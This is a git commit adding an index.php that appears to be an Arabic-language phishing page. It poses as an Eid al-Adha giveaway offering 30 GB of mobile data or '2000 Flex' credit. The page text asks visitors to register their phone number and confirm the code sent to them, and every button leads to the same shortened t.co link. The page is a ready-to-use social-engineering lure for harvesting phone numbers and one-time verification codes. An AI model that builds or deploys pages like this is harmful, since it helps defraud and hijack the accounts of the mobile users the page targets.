03af18490353b4da3f197e9122a674d547703249
ahmedbebo98 <107975784+ahmedbebo98@users.noreply.github.com>
2022-06-29 18:30:55 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,202 @@
+<html><head>
+<html>
+ <head>
+  <title>إستمتع بعرضك الأن</title>
+  <meta content="summary_large_image" name="twitter:card">
+  <meta content="website" property="og:type">
+  <meta content property="og:description">
+  <meta content="https://vv1wqf5fex.preview-postedstuff.com/V2-8rAk-8N1A-i604-cS0k/" property="og:url">
+  <meta content="https://pro-bee-beepro-thumbnails.s3.amazonaws.com/messages/790824/774600/1662877/7510411_large.jpg" property="og:image">
+  <meta content property="og:title">
+  <meta content name="description">
+  <meta charset="utf-8">
+  <meta content="width=device-width" name="viewport">
+  <style>
+   .bee-row,
+		.bee-row-content {
+			position: relative
+		}
+
+		.bee-row-1,
+		.bee-row-2 {
+			background-repeat: no-repeat
+		}
+
+		body {
+			background-image: url(https://k.top4top.io/p_2371h2fiv1.png);
+			color: #000;
+			font-family: Arial, Helvetica Neue, Helvetica, sans-serif
+		}
+
+		a {
+			color: #0068a5
+		}
+
+		* {
+			box-sizing: border-box
+		}
+
+		body,
+		h1 {
+			margin: 0
+		}
+
+		.bee-row-content {
+			max-width: 500px;
+			margin: 0 auto;
+			display: flex
+		}
+
+		.bee-row-content .bee-col-w12 {
+			flex-basis: 100%
+		}
+
+		.bee-button .content {
+			text-align: center
+		}
+
+		.bee-button a,
+		.bee-icon .bee-icon-label-right a {
+			text-decoration: none
+		}
+
+		.bee-image {
+			overflow: auto
+		}
+
+		.bee-image .bee-center {
+			margin: 0 auto
+		}
+
+		.bee-row-1 .bee-col-1 .bee-block-1 {
+			width: 100%
+		}
+
+		.bee-row-1 .bee-col-1,
+		.bee-row-2 .bee-col-1,
+		.bee-row-2 .bee-col-1 .bee-block-1 {
+			padding-bottom: 5px;
+			padding-top: 5px
+		}
+
+		.bee-icon,
+		.bee-icon .bee-icon-image,
+		.bee-icon .bee-icon-label-right {
+			display: inline-block
+		}
+
+		.bee-icon {
+			vertical-align: middle
+		}
+
+		.bee-icon .bee-icon-image {
+			vertical-align: middle;
+			margin-right: -4px
+		}
+
+		.bee-image img {
+			display: block;
+			width: 100%
+		}
+
+		@media (max-width:520px) {
+			.bee-row-content:not(.no_stack) {
+				display: block
+			}
+		}
+
+		.bee-row-1 .bee-row-content,
+		.bee-row-2 .bee-row-content {
+			background-repeat: no-repeat;
+			color: #000
+		}
+
+		.bee-row-1 .bee-col-1 .bee-block-2 {
+			padding: 5px;
+			text-align: center;
+			width: 100%
+		}
+
+		.bee-row-1 .bee-col-1 .bee-block-3,
+		.bee-row-1 .bee-col-1 .bee-block-4 {
+			padding: 5px;
+			text-align: center
+		}
+
+		.bee-row-2 .bee-col-1 .bee-block-1 {
+			color: #9d9d9d;
+			font-family: inherit;
+			font-size: 15px;
+			text-align: center
+		}
+
+		.bee-row-2 .bee-col-1 .bee-block-1 .bee-icon-image {
+			padding: 5px 6px 5px 5px
+		}
+
+		.bee-row-2 .bee-col-1 .bee-block-1 .bee-icon {
+			margin-left: 0;
+			margin-right: 0
+		}
+  </style>
+ <link rel="me" href="https://www.blogger.com/profile/10894203776251845947" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+ <body>
+  <div class="bee-page-container">
+   <div class="bee-row bee-row-1">
+    <div class="bee-row-content">
+     <div class="bee-col bee-col-1 bee-col-w12">
+      <div class="bee-block bee-block-1 bee-image">
+       <a href="https://t.co/tzK4ub54I2">
+        <img alt class="bee-center bee-fixedwidth" src="https://g.top4top.io/p_2371lbmpn1.png" style="max-width:200px;"></a>
+      </div>
+      <div class="bee-block bee-block-2 bee-heading">
+       <h1 style="color:#393d47;direction:ltr;font-family:Arial, Helvetica Neue, Helvetica, sans-serif;font-size:22px;font-weight:700;letter-spacing:normal;line-height:150%;text-align:center;margin-top:0;margin-bottom:0;">
+        <span class="tinyMce-placeholder" style="color: #ffffff ;">
+         إحصل علي هديتك بمناسبة عيد الأضحي المبارك
+         <br>
+         برجاء تسجيل رقم الهاتف و تاكيد الكود الذي سوف يصل اليك
+         <br>
+        </span>
+       </h1>
+      </div>
+      <div class="bee-block bee-block-3 bee-button">
+       <a class="bee-button-content" href="https://t.co/tzK4ub54I2" style="font-size: 14px; line-height: 28px; background-color: #000000; border-bottom: 5px solid ##F9F9F9; border-left: 5px solid #F9F9F9; border-radius: 13px; border-right: 5px solid #F9F9F9; border-top: 5px solid #F9F9F9; color: #ffffff; font-family: inherit; font-weight: 400; letter-spacing: 0px; max-width: 100%; padding-bottom: 5px; padding-left: 25px; padding-right: 25px; padding-top: 5px; width: auto; display: inline-block;">
+        <span style="font-size: 16px; line-height: 200%; word-break: break-word; letter-spacing: normal;">
+         <span style="font-size: 18px; line-height: 36px;">
+          <strong>سجل رقمك للحصول علي 30 جيجاإنترنت</strong>
+         </span>
+		 </span></a>
+		 <br>
+         <br>
+     <div class="bee-block bee-block-3 bee-button">
+       <a class="bee-button-content" href="https://t.co/tzK4ub54I2" style="font-size: 14px; line-height: 28px; background-color: #000000; border-bottom: 5px solid #F9F9F9; border-left: 5px solid #F9F9F9; border-radius: 13px; border-right: 5px solid #F9F9F9; border-top: 5px solid ##F9F9F9; color: #ffffff; font-family: inherit; font-weight: 400; letter-spacing: 0px; max-width: 100%; padding-bottom: 5px; padding-left: 25px; padding-right: 25px; padding-top: 5px; width: auto; display: inline-block;">
+        <span style="font-size: 16px; line-height: 200%; word-break: break-word; letter-spacing: normal;">
+         <span style="font-size: 18px; line-height: 36px;">
+          <strong>سجل رقمك للحصول علي 2000 فليكس</strong>
+         </span>
+         </strong>
+        </span></a>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="bee-row bee-row-2">
+    <div class="bee-row-content">
+     <div class="bee-col bee-col-1 bee-col-w12">
+      <div class="bee-block bee-block-1 bee-icons">
+       <div class="bee-icon">
+        <div class="bee-icon-image">
+            </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
+
+</body></html>
